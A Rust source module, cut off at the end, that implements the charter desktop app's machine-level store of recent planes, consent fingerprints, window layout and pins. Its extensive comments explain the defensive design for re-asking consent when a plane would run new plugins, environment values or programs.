//! What charter keeps **outside** a plane, and the consent that gates opening one.
//!
//! charter's founding rule is that the plane is the state: everything charter knows lives in
//! a `charter.toml` and the directories beside it, committed, and travelling with the clone.
//! This module is an exception the rule cannot express — the app was started from **nowhere**.
//! A double-clicked `.app` has `/` for a working directory, so `plane::resolve` answers
//! `NotFound` and the app has no plane, no recents and no way to be given one. What the opener
//! needs to know belongs to the machine and to no plane on it, so it cannot be kept in one.
//!
//! **It is the second such file, not the first**, and that matters because the rule it follows
//! is already shipped rather than invented here. `charter/report.py:consent_path` has kept
//! consent-to-publish under the human's config home since charter ADR 0003, and its docstring
//! carries the argument for exactly this case: *"Not STATE_DIR: that is per control plane, so
//! a Reporter with several planes would be asked repeatedly until the safeguard became a
//! reflex."* charter-app also already writes its panic log to Tauri's `app_log_dir()`.
//!
//! **Five things, and nothing else:**
//!
//! - **the planes recently opened**, so the opener has something to offer;
//! - **whether the operator approved each one**, and *what it would do when opened* at the
//!   moment they said yes ([`Contribution`]);
//! - **which planes were open in which windows at the last quit**, so a cold launch restores
//!   the window set;
//! - **how the operator arranged what this file already names** — which of those planes are
//!   pinned, and which workspaces inside them ([`Recent::pinned`],
//!   [`Recent::pinned_workspaces`]), and whether charter has pinned a plane's most active
//!   workspaces for them once ([`Recent::most_active_pinned`], ADR 0054), which is a fact
//!   about those pins and not a sixth thing;
//! - **which stream this machine takes charter from** ([`Store::channel`]).
//!
//! **The fourth was three until ADR 0040, and the fifth is newer still; the count is
//! load-bearing.** Those records are the amendments: the operator ruled on 2026-09-22 that a
//! pin is how one operator likes their window rather than a fact about the plane, so it
//! cannot be committed to `charter.toml`, where it would arrive with every clone and put
//! somebody else's workspace first on a strip its operator never arranged. The whole value of
//! "and nothing else" is that each addition had to be argued for; if it can be appended to,
//! it is not a limit.
//!
//! **The fifth is the first entry here that is not about planes at all, so it is argued
//! separately.** The update channel is a fact about *this installation of the app* — which of
//! two release streams it takes its next version from. It is not a copy of anything a plane
//! answers, so the rule the other four are held to (never a second answer to a question the
//! plane already answers) has nothing to catch; and there is no plane it could belong to,
//! because one binary serves every plane on the machine and cannot be on two channels at
//! once. What was weighed against putting it here was a second small file beside this one,
//! and that lost on two counts: it would duplicate this module's hardened read — the
//! `open_no_link`, the `fstat` of the descriptor, the size bound, the `0700` directory — in a
//! second place that has to get containment right a second time, and it would need a lock of
//! its own, because the app and a `charter` in a terminal both write it. [`update`]'s `flock`
//! already makes this file's read-modify-write one act across processes, which is exactly the
//! problem a second file would reintroduce.
//!
//! **Never plane content.** A chat, a memory, a workspace, a persona, a profile: all of those
//! belong to a plane and stay in it. Each plane's own `.charter/app/reopen.json` still
//! restores *its* chats ([`crate::reopen`]) and this module never writes it — the split is
//! "which planes were open" here, "what was open inside one" there. What this module does read
//! from that record is a **fingerprint**, because it is an execution input; see
//! [`Contribution`].
//!
//! **A pinned workspace's name does not breach that, and the distinction is the one the rule
//! was making.** What is forbidden is a *copy* of an answer the plane already gives, because a
//! copy is a second answer that nothing invalidates when the plane changes underneath it. A
//! pin is not a copy: the plane answers "which workspaces exist", and the pin answers "which
//! of them this operator wants first", which the plane does not answer and must not. The name
//! is a **reference** into the plane — the same kind of thing as the plane paths this file has
//! always held, and held to the same rule, which is that a reference is checked when it is
//! read and one that no longer resolves is dropped with a reason. **A chat pin is not here**,
//! for the reason stated above in as many words: a chat is numbered per plane, and its number
//! means nothing outside the plane that issued it. That one lives in the plane's own
//! `.charter/app/reopen.json`.
//!
//! # Where it lives
//!
//! `$CHARTER_CONFIG_HOME`, else `$XDG_CONFIG_HOME`, else `~/.config` — then `charter/`, and
//! [`FILE`] inside it. That is `report.py:consent_path`'s ladder, rung for rung, because a
//! machine should have **one** `charter/` in **one** place and charter already ships one at
//! that address.
//!
//! **This is deliberately not the per-platform application-data directory**, and on macOS the
//! difference is real: `dirs::data_dir()` is `~/Library/Application Support`, which is the
//! platform convention and is where an earlier draft of this module put the store. The cost of
//! taking it is that `charter report`'s consent would sit in `~/.config/charter/` and this
//! store in `~/Library/Application Support/charter/` — two `charter/` directories on one
//! machine, holding two records of the same kind of thing (what the operator has agreed to).
//! One address is worth more than the platform convention for a tool whose operators already
//! live in `~/.config`, and it is the address the shipped half is already at.
//!
//! **`$CHARTER_CONFIG_HOME` is honoured, and it exists for a measured reason** that is not
//! "somebody wanted an override": `gh` keeps its own auth under `$XDG_CONFIG_HOME`, so
//! redirecting *that* variable to isolate charter — in a test, a sandbox, a second account —
//! silently logs `gh` out, which turns a publish into the no-`gh` fallback path. The variable
//! is the way to isolate charter without that side effect, and a Rust charter that ignored it
//! would isolate half the product.
//!
//! The residual, said plainly: a process that can set `$CHARTER_CONFIG_HOME` in charter's
//! environment can point it at a store full of approvals the operator never gave. It is not a
//! way in — the same process can write the real store, which is the same account's file — and
//! the shipped consent file has carried exactly this shape since ADR 0003. It is written down
//! so nobody has to rediscover it.
//!
//! # Windows refuses rather than degrades
//!
//! Every `chmod` call site in this repo is `#[cfg(unix)]` with nothing off it, and on Windows
//! `chmod 0o755` leaves a file at `0o666` (measured, charter-app#98). The `0600`/`0700` this
//! store depends on therefore has no Windows expression today, and ADR 0031 (charter) settles
//! what to do about that: **a guard that cannot be expressed refuses rather than degrades.**
//! So on any platform that is not unix every entry point here returns
//! [`io::ErrorKind::Unsupported`] and charter keeps no machine-level state at all. That is a
//! known quantity; a world-readable list of the operator's projects, and a trust record any
//! account on the machine can edit, is not.
//!
//! # Everything read back is attacker-influenced
//!
//! The file is `0600` in a `0700` directory, so on an honest machine only the operator writes
//! it. That is a reason to treat what comes back as untrusted, not a reason to trust it: the
//! store is the one charter file that is **not** in a plane's git history, so nothing else
//! vouches for it, and a plane path it names is a path charter is about to open a window on.
//! So on read every stored path is held to being absolute, free of `..` and free of a NUL,
//! and an entry that fails is **dropped with a reason** ([`Dropped`]) rather than raised. An
//! opener that shows one fewer row and says why is usable; an error dialog at launch, before
//! there is a window, is not.
//!
//! Whether a remembered path is still *there*, and still a plane, is a different question and
//! is deliberately **not** asked on the read path — see [`still_a_plane`].

use std::collections::BTreeMap;
use std::io;
use std::path::{Component, Path, PathBuf};

/// charter's own directory inside the config home — the one the Python `charter report` kept
/// its publish consent in. The Rust `charter report` keeps none (ADR 0059).
pub const DIR: &str = "charter";

/// The store, inside [`DIR`].
pub const FILE: &str = "machine.json";

/// The one version of this file charter writes and reads. Any other version reads as an empty
/// store: there is no migration that would be honest about an approval recorded under rules
/// this charter does not know.
pub const VERSION: u32 = 1;

/// The most this file may be. It is a bounded list of short entries, it is read whole, and it
/// is read before there is a window — so a planted giant here is a launch that never
/// finishes, exactly as it is for [`crate::reopen`]'s record.
pub const MAX_BYTES: u64 = 1 << 20;

/// How many **unpinned** planes are remembered. The list is bounded because the file is read
/// at every launch and nothing else prunes it.
///
/// **Falling off the end forgets the approval too**, because the approval is a field of the
/// entry (see [`Recent`]). That direction is the safe one: the plane is asked about again the
/// next time it is opened.
///
/// **A pinned plane does not count against it** (ADR 0040). Losing a pinned project to
/// the sixty-fifth plane opened would make pinning meaningless on exactly the machine that
/// most needs it — the one with a lot of planes — and pinning is the only thing an operator
/// can say to mean "not this one". [`MOST_PINNED`] is what keeps the file bounded all the
/// same.
pub const MOST_RECENTS: usize = 64;

/// How many planes may be pinned, on top of [`MOST_RECENTS`].
///
/// A pin exempts an entry from the recents bound, so without a bound of its own the file would
/// have none — and it is read whole at a cold launch, before there is a window. The operator
/// can only pin a plane they have opened, so reaching this by hand takes thirty-two deliberate
/// acts; a file that claims more was not written by charter.
pub const MOST_PINNED: usize = 32;

/// How many workspaces may be pinned inside one plane.
///
/// The same reason as [`MOST_PINNED`], one scope down: the strip a pin orders holds ten
/// workspaces at ADR 0026's limits, and a plane claiming a thousand pinned workspaces is a
/// file charter did not write.
pub const MOST_PINNED_WORKSPACES: usize = 32;

/// How many workspaces [`Store::pin_the_most_active`] pins in a plane charter has not pinned
/// any in before (ADR 0054): an operator with many workspaces works in about three.
pub const FIRST_OPEN_PINS: usize = 3;

/// The two bounds, counted apart, in one place.
///
/// **Three callers and one rule.** The size of this file is decided three times — when an
/// open puts a plane at the front ([`Store::trim`]), when the file is read back ([`load`])
/// and when it is written out ([`OnDisk::from`]) — and a pinned entry has to be exempt from
/// [`MOST_RECENTS`] in all three or a pin quietly stops working in whichever one was missed.
/// Three implementations of one rule is the drift this module's own docstring is about.
#[derive(Default)]
struct Room {
    unpinned: usize,
    pinned: usize,
}

impl Room {
    /// Whether one more entry of this kind fits, counting it in if it does.
    fn fits(&mut self, pinned: bool) -> bool {
        let (counted, most) = if pinned {
            (&mut self.pinned, MOST_PINNED)
        } else {
            (&mut self.unpinned, MOST_RECENTS)
        };
        *counted += 1;
        *counted <= most
    }

    /// Why one did not, in the words a dropped row carries.
    fn why(pinned: bool) -> String {
        if pinned {
            format!("is past the {MOST_PINNED} projects charter pins")
        } else {
            format!("is past the {MOST_RECENTS} planes charter remembers")
        }
    }
}

/// The most a workspace name may be, in bytes.
///
/// A workspace is a directory beside `charter.toml`, so this is the longest name the file
/// systems charter runs on will give one. It is a bound on what is read back, not a rule about
/// what a workspace may be called.
const LONGEST_WORKSPACE_NAME: usize = 255;

/// The environment variable that moves charter's config home, and **only** charter's.
///
/// `report.py:consent_path` reads it first for a reason worth keeping in one piece: `gh` keeps
/// its own auth under `$XDG_CONFIG_HOME`, so isolating charter by redirecting that variable
/// logs `gh` out and silently turns a publish into the no-`gh` fallback path.
pub const HOME_VAR: &str = "CHARTER_CONFIG_HOME";

/// The human's config home: `$CHARTER_CONFIG_HOME`, else `$XDG_CONFIG_HOME`, else
/// `~/.config`. `None` when there is no home to put one in.
///
/// `report.py:consent_path`'s ladder, rung for rung, so that charter has one config home per
/// machine rather than one per implementation. An empty variable is treated as unset, which
/// is what an exported-but-blank `XDG_CONFIG_HOME` means everywhere else.
///
/// `dirs::home_dir` for the last rung rather than `$HOME` read by hand: it is the mature,
/// standard answer, it is already in this workspace's lockfile (Tauri depends on it), and it
/// knows the cases a hand-rolled `$HOME` does not.
pub fn config_root() -> Option<PathBuf> {
    let found = rooted(
        std::env::var_os(HOME_VAR),
        std::env::var_os("XDG_CONFIG_HOME"),
        dirs::home_dir(),
    );
    // The store is the OTHER thing a run reaches past its own fixture into, and it is not in
    // a plane: a launcher that pinned `$CHARTER_ROOT` and forgot `$CHARTER_CONFIG_HOME` wrote
    // its throwaway projects and their trust into the operator's `~/.config/charter`, which
    // is where charter decides what it may open without asking. `wdio.bench.conf.ts` did
    // exactly that. So a fenced build is held here too (charter-app#129).
    if let Some(root) = &found {
        crate::fence::hold(crate::fence::Act::Store, root);
    }
    found
}

/// [`config_root`], for `charter doctor`'s plugin rows, which read the copy `charter plugin
/// install` keeps under it: fenced once there is a directory there to read, as
/// [`config_root_if_there`] is, and otherwise the answer with nothing asked — a directory that
/// does not exist holds no copy, and a doctor run in a fixture must still be able to say so.
pub fn config_root_to_read_the_plugin_copy() -> Option<PathBuf> {
    let found = rooted(
        std::env::var_os(HOME_VAR),
        std::env::var_os("XDG_CONFIG_HOME"),
        dirs::home_dir(),
    )?;
    if found.is_dir() {
        crate::fence::hold(crate::fence::Act::Store, &found);
    }
    Some(found)
}

/// [`config_root`], for a reader that only reads: `None` as well when there is no directory
/// there yet, since a store that does not exist holds nothing to read.
///
/// **For `charter statusline`'s hot path** (charter-app#340), which reads the extension record
/// for badges every turn. A fenced test build refuses a store outside its fence, and a store
/// that is not there yet cannot be shown to be inside it — its path does not resolve — so the
/// fence is asked only about a store that exists. Nothing is read from one that does not.
pub fn config_root_if_there() -> Option<PathBuf> {
    let found = rooted(
        std::env::var_os(HOME_VAR),
        std::env::var_os("XDG_CONFIG_HOME"),
        dirs::home_dir(),
    )?;
    if !found.is_dir() {
        return None;
    }
    crate::fence::hold(crate::fence::Act::Store, &found);
    Some(found)
}

/// [`config_root`]'s ladder, with the three answers handed in.
///
/// Split out because the environment is the one thing this module's tests cannot drive:
/// `std::env::set_var` is `unsafe` in this edition and the workspace is
/// `unsafe_code = "forbid"`, and it is process-global besides, so a test that set it would
/// race every other test in the same binary. The ladder is the part worth testing, so the
/// ladder is what is testable.
fn rooted(
    charter_home: Option<std::ffi::OsString>,
    xdg: Option<std::ffi::OsString>,
    home: Option<PathBuf>,
) -> Option<PathBuf> {
    for set in [charter_home, xdg] {
        // An exported-but-blank variable is unset, which is what it means everywhere else.
        if let Some(set) = set.filter(|value| !value.is_empty()) {
            return Some(PathBuf::from(set));
        }
    }
    home.map(|home| home.join(".config"))
}

/// charter's directory inside `config_root`.
pub fn dir(config_root: &Path) -> PathBuf {
    config_root.join(DIR)
}

/// The store's own path inside `config_root`.
pub fn file(config_root: &Path) -> PathBuf {
    dir(config_root).join(FILE)
}

/// Whether charter keeps machine-level state on this platform at all.
///
/// See the module docstring: on Windows the `0600`/`0700` this store depends on has no
/// expression, and ADR 0031 says such a guard refuses.
#[cfg(unix)]
pub(crate) fn supported() -> io::Result<()> {
    Ok(())
}

/// Off unix only. On unix, where the mutation run happens, `supported` IS `Ok(())`, so the
/// mutant that makes it so is excluded in `.cargo/mutants.toml`: the refusal below is code no
/// unix build compiles, and the unix twin above already is the mutant.
#[cfg(not(unix))]
pub(crate) fn supported() -> io::Result<()> {
    Err(io::Error::new(
        io::ErrorKind::Unsupported,
        "charter keeps no machine-level store on this platform: the 0600 on the file and the \
         0700 on its directory have no expression here (charter-app#98), and a guard that \
         cannot be expressed refuses rather than degrades (ADR 0031)",
    ))
}

/// What opening `plane` would do to this machine — everything the approval is *of*.
///
/// **Two sources, and the second is the bigger one.**
///
/// *The settings that travel.* `layer::WORKSPACE_KEYS` is `["enabledPlugins", "env"]`: those
/// two keys travel out of a plane's own committed `.claude/settings.json` into the
/// `.claude/settings.json` a harness reads. So opening a stranger's plane lets its author
/// choose the plugins that run and the environment every chat is started under — `PATH`,
/// `NODE_OPTIONS`, a base URL a harness talks to. The two existing limits on that travel are
/// not weakened here and are why this covers those two keys and not three: `permissions`
/// travels only as `ask`/`deny` and **never** as `allow` (`layer::RESTRICTIVE`), so it cannot
/// make anything run that would not have run anyway; and a harness profile is machine-local
/// (ADR 0022), so a plane cannot bring a command line with it.
///
/// *The record that starts programs.* `app/src-tauri/src/lib.rs`'s `setup` calls
/// `chats.put_back(&record, root, STARTING)`, and its own comment says **"Before a single
/// session is started, because `put_back` below starts them."** `Chats::start_recorded` then
/// takes a chat with no profile straight to `Chats::start`, whose doc says what runs is
/// *"decided from the record alone"*. So `.charter/app/reopen.json` is an **execution
/// input**, read before there is a window and with nothing to click. `reopen`'s own module
/// docstring already says so: *"this file is, for whoever can write it, a way to have a
/// command run at every later launch."*
///
/// **`.charter/` is gitignored, and that is not the reassurance it sounds like.** It keeps the
/// record out of a `git clone`; the opener opens a **directory**, and directories arrive by
/// zip, shared folder, USB and download.
///
/// So [`starts`](Self::starts) fingerprints every chat the record would launch by its own
/// program and arguments, and [`profiles`](Self::profiles) the ones that name a harness
/// profile instead. They are separate because only one of them is a grant — see
/// [`Consent::must_ask`].
///
/// **Values are recorded, not only names.** An `env` whose `PATH` gains a directory is a
/// different grant from the one approved, and a record of names alone could not see it. What
/// is recorded comes from files inside the plane, so this moves nothing into the machine store
/// that was not already readable in the plane.
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct Contribution {
    /// Each plugin the plane enables, and what it enables it as.
    pub plugins: BTreeMap<String, String>,
    /// Each environment variable the plane sets, and its value.
    pub env: BTreeMap<String, String>,
    /// One key per recorded chat that names its **own** program: the JSON of its program, its
    /// arguments and its working directory. The value is always empty — the whole launch is
    /// the identity, so two chats running the same program in different directories are two
    /// entries and neither can hide the other.
    pub starts: BTreeMap<String, String>,
    /// One key per recorded chat that names a harness **profile** instead: the JSON of the
    /// profile's name and the working directory.
    pub profiles: BTreeMap<String, String>,
}

impl Contribution {
    /// What opening `plane` would do, right now — for a caller that will not act on the
    /// record.
    ///
    /// Use [`Self::read`] wherever the same act both *shows* the operator a contribution and
    /// *starts* what it describes: this throws the record away, so such a caller has to read
    /// it a second time, and a write landing between the two reads is executed without having
    /// been shown (charter-app#123).
    pub fn of(plane: &Path) -> Self {
        Self::read(plane).contributes
    }

    /// What opening `plane` would do, right now, **and the record that says so**.
    ///
    /// Both halves fail **closed and quiet**: settings charter cannot read contribute nothing,
    /// and a reopen record charter would refuse contributes nothing — because a record the app
    /// refuses is one it starts no chats from either (`lib.rs` logs the refusal and puts back
    /// `Record::default()`). Neither is credited with whatever it might have said.
    ///
    /// **The record comes back because it is an execution input** (charter-app#123). What the
    /// dialog drew is read out of `.charter/app/reopen.json`; what `put_back` starts used to
    /// be read out of it again, a moment later. Two reads of a file that decides what runs is
    /// a window, however short, in which a write is executed without having been shown. So the
    /// bytes this read got are handed back, and `Planes::approve_and_open` passes *those* to
    /// `put_back` — the window closes by construction rather than by being narrowed.
    ///
    /// **Bounded, and the bound is stated rather than implied.** ADR 0035 says of its own
    /// fingerprint that it is *"not a defence against an agent that set out to forge the
    /// fingerprint"*, and that sentence is unchanged by this. What closes is the window
    /// between a human clicking a button and the app reading a file. Nothing here guards an
    /// approved plane, and nothing here holds the file.
    pub fn read(plane: &Path) -> Reading {
        let mut out = Self::default();
        if let Some(settings) = crate::layer::plane_settings(plane, crate::layer::SETTINGS) {
            out.plugins = settings
                .get("enabledPlugins")
                .map(plugins_of)
                .unwrap_or_default();
            out.env = settings
                .get("env")
                .and_then(serde_json::Value::as_object)
                .map(|map| map.iter().map(|(k, v)| (k.clone(), word(v))).collect())
                .unwrap_or_default();
        }
        // Through `reopen`, never by reading the file here: that read is already gated on the
        // exact path it opens, bounded, and refuses a FIFO — and a second reader of the same
        // file would be a second set of rules about it.
        let record = crate::reopen::read_or_refusal(plane);
        if let Ok(record) = &record {
            for chat in &record.chats {
                let cwd = chat
                    .cwd
                    .as_ref()
                    .map(|cwd| cwd.display().to_string())
                    .unwrap_or_default();
                match &chat.profile {
                    // The profile is looked up again at every launch out of machine-local
                    // `charter.local.toml` (ADR 0022, `Chats::start_recorded`), so the record
                    // chooses WHICH of the operator's own profiles runs and never what it
                    // runs. Recorded so a change can be reported; not a grant.
                    Some(name) => out.profiles.insert(
                        serde_json::json!({ "profile": name, "cwd": cwd }).to_string(),
                        String::new(),
                    ),
                    None => out.starts.insert(
                        serde_json::json!({
                            "program": chat.program,
                            "args": chat.args,
                            "cwd": cwd,
                        })
                        .to_string(),
                        String::new(),
                    ),
                };
            }
        }
        Reading {
            contributes: out,
            record,
        }
    }

    /// Every way `now` differs from what this recorded, in a stable order.
    pub fn against(&self, now: &Self) -> Vec<Change> {
        let mut out = Vec::new();
        diff(
            &self.plugins,
            &now.plugins,
            Change::PluginAdded,
            Change::PluginRemoved,
            Change::PluginChanged,
            &mut out,
        );
        diff(
            &self.env,
            &now.env,
            Change::EnvAdded,
            Change::EnvRemoved,
            Change::EnvChanged,
            &mut out,
        );
        // The whole launch is the key and the value is always empty, so the "changed" arm
        // cannot fire. It is spelled as the ASKING variant anyway, so that a later version
        // which does put a value there fails closed rather than silently stops asking.
        diff(
            &self.starts,
            &now.starts,
            Change::StartsAdded,
            Change::StartsRemoved,
            Change::StartsAdded,
            &mut out,
        );
        diff(
            &self.profiles,
            &now.profiles,
            Change::ProfileAdded,
            Change::ProfileRemoved,
            Change::ProfileAdded,
            &mut out,
        );
        out
    }
}

/// One read of a plane: what opening it would contribute, and the reopen record those
/// contributions were taken from.
///
/// **The two travel together because they are one answer** (charter-app#123). The record is an
/// execution input — putting it back starts the programs it names — and the contribution is
/// what the operator is shown about it. A caller that has the first and re-reads the second is
/// showing one file and running another, with however many milliseconds between them for a
/// write to land. Handing both back from one read makes that impossible to write by accident:
/// `Planes::approve_and_open` passes this record straight to `put_back`.
///
/// The record is kept as the `Result` the read gave, not flattened to an `Option`. A record
/// charter **refused** and a plane with **no record at all** are different things to tell an
/// operator — `Held::reopen` prints the refusal and says nothing is reopened until it is
/// repaired — and a reader that lost the reason would have to go back to the disk to find it,
/// which is the second read this whole type exists to remove.
#[derive(Debug)]
pub struct Reading {
    /// What opening the plane would put in force.
    pub contributes: Contribution,
    /// The record as it was read, or why charter would not read it.
    pub record: Result<crate::reopen::Record, io::Error>,
}

/// `enabledPlugins` as a name-to-value map, whatever shape the key is in.
///
/// An object is the shape a settings file uses (`{"name@market": true}`), and an array of
/// names is the other one anyone writes by hand. Anything else — a string, a number, `null` —
/// is keyed by its own rendering, so a plane that changes it is still **noticed** rather than
/// quietly read as contributing nothing. A reader that assumed a shape would be the crash a
/// launch cannot have.
fn plugins_of(value: &serde_json::Value) -> BTreeMap<String, String> {
    match value {
        serde_json::Value::Object(map) => map.iter().map(|(k, v)| (k.clone(), word(v))).collect(),
        serde_json::Value::Array(items) => items.iter().map(|v| (word(v), String::new())).collect(),
        other => [(word(other), String::new())].into_iter().collect(),
    }
}

/// A JSON value as one comparable word: a string as itself, anything else as its compact
/// rendering.
fn word(value: &serde_json::Value) -> String {
    match value {
        serde_json::Value::String(text) => text.clone(),
        other => other.to_string(),
    }
}

fn diff(
    was: &BTreeMap<String, String>,
    now: &BTreeMap<String, String>,
    added: fn(String) -> Change,
    removed: fn(String) -> Change,
    changed: fn(String) -> Change,
    out: &mut Vec<Change>,
) {
    for (name, value) in now {
        match was.get(name) {
            None => out.push(added(name.clone())),
            Some(before) if before != value => out.push(changed(name.clone())),
            Some(_) => {}
        }
    }
    for name in was.keys() {
        if !now.contains_key(name) {
            out.push(removed(name.clone()));
        }
    }
}

/// One way a plane's contribution differs from the one that was approved.
///
/// **The name only, never the value.** The caller holds both contributions and can show
/// whatever it needs; a variant carrying a value would put the contents of every plane's
/// `env` into every string a refusal, a log line or a report is built from.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Change {
    PluginAdded(String),
    PluginRemoved(String),
    PluginChanged(String),
    EnvAdded(String),
    EnvRemoved(String),
    EnvChanged(String),
    /// A chat the reopen record would start on a program of its own choosing.
    StartsAdded(String),
    StartsRemoved(String),
    /// A chat the reopen record would start on one of this machine's harness profiles.
    ProfileAdded(String),
    ProfileRemoved(String),
}

impl Change {
    /// Whether this change can make something run that the approval did not cover.
    ///
    /// An addition or a changed value can; a removal cannot. That asymmetry is the same one
    /// `layer::RESTRICTIVE` already makes about `ask`/`deny`, and it is what [`Consent`]
    /// turns into "ask again" or "just say so".
    ///
    /// **A profile is the one addition that is not a grant**, and the reason is measured
    /// rather than assumed: `Chats::start_recorded` looks the profile up again in
    /// machine-local `charter.local.toml` at every launch — *"never taken from the record"* —
    /// and `profiles::Source` decides whether `profiletrust::approval_needed` shows its
    /// command line first. A profile that is gone skips the chat by name. So the record
    /// chooses **which** of the operator's own, already-gated profiles runs, and never what
    /// it runs. Asking again here would be asking a second time about a command line
    /// `profiletrust` is about to show.
    pub fn is_a_grant(&self) -> bool {
        match self {
            Self::PluginAdded(_)
            | Self::PluginChanged(_)
            | Self::EnvAdded(_)
            | Self::EnvChanged(_)
            | Self::StartsAdded(_) => true,
            Self::PluginRemoved(_)
            | Self::EnvRemoved(_)
            | Self::StartsRemoved(_)
            | Self::ProfileAdded(_)
            | Self::ProfileRemoved(_) => false,
        }
    }

    /// The name — or, for a launch, the whole recorded command line — this change is about.
    pub fn name(&self) -> &str {
        match self {
            Self::PluginAdded(name)
            | Self::PluginRemoved(name)
            | Self::PluginChanged(name)
            | Self::EnvAdded(name)
            | Self::EnvRemoved(name)
            | Self::EnvChanged(name)
            | Self::StartsAdded(name)
            | Self::StartsRemoved(name)
            | Self::ProfileAdded(name)
            | Self::ProfileRemoved(name) => name,
        }
    }
}

impl std::fmt::Display for Change {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        let (what, how) = match self {
            Self::PluginAdded(_) => ("plugin", "is new"),
            Self::PluginRemoved(_) => ("plugin", "is gone"),
            Self::PluginChanged(_) => ("plugin", "is enabled differently"),
            Self::EnvAdded(_) => ("environment variable", "is new"),
            Self::EnvRemoved(_) => ("environment variable", "is gone"),
            Self::EnvChanged(_) => ("environment variable", "has a different value"),
            Self::StartsAdded(_) => ("chat this plane would start", "is new"),
            Self::StartsRemoved(_) => ("chat this plane would start", "is gone"),
            Self::ProfileAdded(_) => ("chat on one of your harness profiles", "is new"),
            Self::ProfileRemoved(_) => ("chat on one of your harness profiles", "is gone"),
        };
        write!(f, "the {what} {} {how}", self.name())
    }
}

/// Whether a plane may be opened without asking, and why not.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Consent {
    /// Nothing has recorded this plane. Ask.
    New,
    /// It was approved, and it contributes exactly what was approved.
    Unchanged,
    /// It was approved, and it would now do **more** — a plugin, an environment variable, a
    /// different value for one it already had, or a chat it would start on a program of its
    /// own. Ask again, and say what is new.
    Grew(Vec<Change>),
    /// It was approved, and what changed cannot make anything more run. Say so; do not ask.
    Noted(Vec<Change>),
}

impl Consent {
    /// Whether the operator has to be asked before this plane is opened.
    ///
    /// **A change re-asks; a withdrawal only reports.** The argument is the blast radius of
    /// what actually changed, and it is `layer::RESTRICTIVE`'s argument applied one level up.
    ///
    /// *Why an addition re-asks.* An approval is consent to a **contribution**, not to a
    /// path. `enabledPlugins` is code that will run inside the operator's harness and `env`
    /// decides what that harness talks to — so a plane that gains either after it was
    /// approved has been handed a grant nobody looked at. Reporting it and opening anyway
    /// would put the notice in the one place an operator has already decided not to read: a
    /// window that opened successfully. [`crate::profiletrust`] settled the identical
    /// question for a profile's command line — `Approval::Changed` asks — and a plugin is
    /// strictly more than a command line, so a weaker rule here would be the same decision
    /// made twice with different answers, which is the defect this repo keeps finding.
    ///
    /// *Why a withdrawal does not.* Removing a plugin or an environment variable cannot make
    /// anything run that would not have run under the approval already given; it can only
    /// make less run. A prompt that never carries risk is a prompt an operator learns to
    /// answer yes to without reading, which spends the attention the real question needs.
    /// So a shrinkage is reported — the store still records what changed — and nothing stops.
    ///
    /// *Mixed.* One addition among ten removals is [`Consent::Grew`] and asks: the question
    /// is whether anything new was granted, never how much was given back.
    ///
    /// *Why a new chat in the reopen record asks.* It is a program and an argument list the
    /// app runs synchronously, in `setup`, before there is a window to close or a tray to
    /// quit from. There is no shape that separates a harness the operator installed from
    /// anything else — `reopen` says so in those words — so the only honest gate is consent,
    /// and the only moment it can be given is before the launch.
    ///
    /// *Why a profile chat does not.* See [`Change::is_a_grant`]: the record chooses which of
    /// this machine's own profiles runs, `profiletrust` gates what any of them runs, and a
    /// profile that is gone skips the chat.
    ///
    /// **This only works if charter vouches for its own writes.** charter rewrites the reopen
    /// record every time a chat opens or closes, so a fingerprint that were only ever taken at
    /// approval would disagree with the operator's own next action and ask again about a chat
    /// they just started — the training-to-click-yes failure, by the other road. [`Store::
    /// vouch`] is the answer, and the wiring contract is written there.
    pub fn must_ask(&self) -> bool {
        matches!(self, Self::New | Self::Grew(_))
    }

    /// What changed, for a caller that wants to say so. Empty unless something did.
    pub fn changes(&self) -> &[Change] {
        match self {
            Self::New | Self::Unchanged => &[],
            Self::Grew(changes) | Self::Noted(changes) => changes,
        }
    }
}

/// What the operator approved about one plane, and when.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Trust {
    /// Seconds since the epoch.
    pub approved: u64,
    /// What the plane contributed at that moment — not merely that it was approved. The
    /// difference is the whole of [`Consent`].
    pub contributed: Contribution,
}

/// One plane the operator has opened.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Recent {
    /// Absolute, `..`-free, as it was when it was opened. Whether anything is still there is
    /// [`still_a_plane`]'s question.
    pub plane: PathBuf,
    /// Seconds since the epoch.
    pub opened: u64,
    /// The approval, where there is one.
    ///
    /// **A field of the entry, so there are never two lists to keep in step.** Forgetting a
    /// plane forgets its approval with it, which is both the simple implementation and the
    /// safe direction: the plane is asked about again.
    pub trust: Option<Trust>,
    /// Whether the operator pinned this project (ADR 0039, stored per ADR 0040).
    ///
    /// A field of the entry for the same reason the approval is: forgetting a plane forgets
    /// its pin, and there is never a second list of pins to go stale against this one. It is
    /// also what exempts the entry from [`MOST_RECENTS`].
    pub pinned: bool,
    /// The workspaces inside this plane the operator pinned, by name.
    ///
    /// **References into the plane, never a copy of what the plane says.** The plane is what
    /// says which workspaces exist and in what order; this says which of them this operator
    /// wants first, which is a fact about the operator and false inside any one plane. A name
    /// here that no longer names a workspace is a dangling reference and reads as one — see
    /// [`Store::pinned_workspaces`].
    ///
    /// **In the order they were pinned in**, each name once: a pin is appended, an unpin takes
    /// its name out, and the workspace strip draws them in this order (ADR 0054, charter#402).
    /// This was a set drawn in the plane's order until then; a file written that way holds its
    /// names sorted, which is the plane's own order, so it reads back as the arrangement the
    /// operator already saw ([`read`]).
    pub pinned_workspaces: Vec<String>,
    /// Whether [`Store::pin_the_most_active`] has run for this plane (ADR 0054).
    ///
    /// **Beside the pins, because it is a fact about them**: that this operator's workspace
    /// pins in this plane were started for them once, so that what is pinned now is theirs.
    /// Without it an operator who unpinned everything would be pinned again at the next open,
    /// and the strip would be arranging itself. Forgetting the plane forgets it with the pins,
    /// and the next open pins again — which is the arrangement a first open gets.
    pub most_active_pinned: bool,
}

/// One window, and the planes it had open as tabs.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Window {
    /// Left to right, as the tabs were.
    pub planes: Vec<PathBuf>,
    /// Which tab was in front. Always a valid index into `planes`, which is not something a
    /// file can promise — see [`read`].
    pub active: usize,
}

/// Everything charter keeps outside a plane.
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct Store {
    /// Most recently opened first.
    pub recents: Vec<Recent>,
    pub windows: Vec<Window>,
    /// Which stream this machine takes charter from ([`crate::updates::Channel`]).
    ///
    /// The fifth thing, and the first that is not about planes at all — the module note above
